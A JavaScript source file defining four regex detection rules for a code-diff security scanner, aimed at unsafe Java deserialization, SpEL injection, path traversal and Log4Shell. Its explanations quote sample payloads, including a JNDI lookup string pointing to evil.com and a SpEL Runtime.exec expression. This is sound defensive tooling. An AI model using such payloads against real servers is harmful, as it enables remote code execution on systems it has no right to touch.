/**
 * Java / Spring-specific FAIL rules
 *
 * Philosophy: Covers Java idioms that don't map cleanly to the generic patterns
 * in injection.js — Spring MVC annotations, Java deserialization, and SpEL injection.
 * Low noise: only fires on patterns with near-zero legitimate use.
 */

// JAVA001: Java deserialization without class filtering
export const JAVA001_UNSAFE_DESERIALIZATION = {
    id: "JAVA001_UNSAFE_DESERIALIZATION",
    tier: "TIER_1",
    kind: "FAIL",
    category: "Injection",
    severity: "CRITICAL",
    appliesTo: {
        fileGlobs: ["**/*.{java,kt}"],
        scanMode: "DIFF",
        diffLines: "ADDED_ONLY",
        textOnly: true
    },
    triggerPolicy: { noise: "LOW", minimumConfidenceToEmit: "HIGH", requireSameHunk: true, allowSuppression: true },
    detection: {
        type: "REGEX",
        patterns: [
            // ObjectInputStream.readObject() without a filter is inherently unsafe
            "(?i)\\bnew\\s+ObjectInputStream\\s*\\(",
            // XMLDecoder is equivalent to native deserialization
            "(?i)\\bnew\\s+XMLDecoder\\s*\\(",
            // XStream without security restrictions
            "(?i)\\bnew\\s+XStream\\s*\\(\\s*\\)",
            // Yaml.load without SafeConstructor (SnakeYAML)
            "(?i)\\bnew\\s+Yaml\\s*\\(\\s*\\)\\s*\\.\\s*load\\s*\\("
        ]
    },
    explanation: {
        title: "Unsafe Java deserialization",
        description: "Java deserialization via ObjectInputStream, XMLDecoder, XStream, or unconfigured SnakeYAML was introduced.",
        risk: "Java deserialization of untrusted data is a critical RCE vector (CWE-502). Attackers can craft gadget chains to execute arbitrary code on the server.",
        confidenceRationale: "These APIs are inherently unsafe without class filtering/allowlisting; the presence of the call in a diff is sufficient to trigger.",
        recommendation: "Use a deserialization filter (ObjectInputFilter in Java 9+), replace XMLDecoder with JAXB, configure XStream with a security framework, and replace Yaml.load with Yaml.safeLoad or SafeConstructor."
    }
};

// JAVA002: Spring SpEL injection via user-controlled expression
export const JAVA002_SPEL_INJECTION = {
    id: "JAVA002_SPEL_INJECTION",
    tier: "TIER_1",
    kind: "FAIL",
    category: "Injection",
    severity: "CRITICAL",
    appliesTo: {
        fileGlobs: ["**/*.{java,kt}"],
        scanMode: "DIFF",
        diffLines: "ADDED_ONLY",
        textOnly: true
    },
    triggerPolicy: { noise: "LOW", minimumConfidenceToEmit: "HIGH", requireSameHunk: true, allowSuppression: true },
    detection: {
        type: "REGEX",
        patterns: [
            // ExpressionParser.parseExpression(request.getParameter(...))
            "(?i)\\bparseExpression\\s*\\([^)]*request\\.getParameter\\(",
            "(?i)\\bparseExpression\\s*\\([^)]*\\+\\s*request\\.getParameter\\(",
            // StandardEvaluationContext with setValue/getValue from request data
            "(?i)\\bStandardEvaluationContext\\b.{0,200}request\\.getParameter\\(",
            // @Value annotation with user-controlled property (less common but critical)
            "(?i)\\bSpelExpressionParser\\b.{0,200}request\\.getParameter\\("
        ]
    },
    explanation: {
        title: "Spring Expression Language (SpEL) injection",
        description: "A Spring SpEL expression is parsed or evaluated using request-derived input.",
        risk: "SpEL injection allows RCE — attackers can execute arbitrary Java code by crafting malicious expressions like T(java.lang.Runtime).getRuntime().exec('...').",
        confidenceRationale: "parseExpression() or StandardEvaluationContext with user input is an unambiguous SpEL injection pattern.",
        recommendation: "Never pass user input to SpEL parsers. Use SimpleEvaluationContext if dynamic evaluation is required, which restricts the expression language to a safe subset."
    }
};

// JAVA003: Path traversal via request parameter in file operations
export const JAVA003_PATH_TRAVERSAL = {
    id: "JAVA003_PATH_TRAVERSAL",
    tier: "TIER_1",
    kind: "FAIL",
    category: "Injection",
    severity: "HIGH",
    appliesTo: {
        fileGlobs: ["**/*.{java,kt}"],
        scanMode: "DIFF",
        diffLines: "ADDED_ONLY",
        textOnly: true
    },
    triggerPolicy: { noise: "LOW", minimumConfidenceToEmit: "HIGH", requireSameHunk: true, allowSuppression: true },
    detection: {
        type: "REGEX",
        patterns: [
            // new File(basePath + request.getParameter(...))
            "(?i)new\\s+File\\s*\\([^)]*request\\.getParameter\\(",
            "(?i)new\\s+File\\s*\\([^)]*\\+\\s*request\\.getParameter\\(",
            // Paths.get or Files.* with request.getParameter
            "(?i)Paths\\.get\\s*\\([^)]*request\\.getParameter\\(",
            "(?i)Files\\.(read|write|copy|delete|newInputStream|newOutputStream)\\b.{0,200}request\\.getParameter\\("
        ]
    },
    explanation: {
        title: "Path traversal via request parameter in Java file operation",
        description: "A Java file operation constructs a file path using request-derived input without sanitization.",
        risk: "Path traversal (CWE-22) allows attackers to read sensitive files (private keys, config, /etc/passwd) or write files to arbitrary locations.",
        confidenceRationale: "File API + request.getParameter on the same line is a high-confidence path traversal indicator.",
        recommendation: "Normalize and validate paths server-side. Use file.getCanonicalPath() and verify it starts with an expected base directory. Never construct paths from unsanitized user input."
    }
};

// JAVA004: Log4Shell / JNDI Injection via logging
export const JAVA004_LOG4SHELL_JNDI = {
    id: "JAVA004_LOG4SHELL_JNDI",
    tier: "TIER_1",
    kind: "FAIL",
    category: "Injection",
    severity: "CRITICAL",
    appliesTo: {
        fileGlobs: ["**/*.{java,kt}"],
        scanMode: "DIFF",
        diffLines: "ADDED_ONLY",
        textOnly: true
    },
    triggerPolicy: { noise: "LOW", minimumConfidenceToEmit: "HIGH", requireSameHunk: true, allowSuppression: true },
    detection: {
        type: "REGEX",
        patterns: [
            // Logging with string concatenation of request parameters
            "(?i)logger\\.(info|error|warn|debug|fatal|log)\\s*\\([^)]*request\\.getParameter\\(",
            "(?i)logger\\.(info|error|warn|debug|fatal|log)\\s*\\([^)]*\\+\\s*request\\.getParameter\\(",
            // Logback/Log4j2 style ${} in log message with nearby request data
            "(?i)logger\\..*\\(.*\\$\\{.*\\}.*request\\.getParameter"
        ]
    },
    explanation: {
        title: "Log4Shell / JNDI Injection",
        description: "User-supplied input is logged directly using a logging framework, which may enable JNDI injection (Log4Shell).",
        risk: "Allows Remote Code Execution (RCE). Attackers can inject ${jndi:ldap://evil.com/a} sequences to trigger the logging framework to download and execute malicious code.",
        confidenceRationale: "Logging uncleaned user input in Java environments is a high-risk pattern due to Log4Shell vulnerabilities in many common configurations.",
        recommendation: "Never log untrusted data directly. Use a safe logging pattern (e.g., passing data as parameters to the log method rather than concatenating) and ensure log4j and related libraries are updated to patched versions. Disable JNDI lookups in logging configurations if not required."
    }
};

export const FAIL_JAVA_RULES = [
    JAVA001_UNSAFE_DESERIALIZATION,
    JAVA002_SPEL_INJECTION,
    JAVA003_PATH_TRAVERSAL,
    JAVA004_LOG4SHELL_JNDI
];
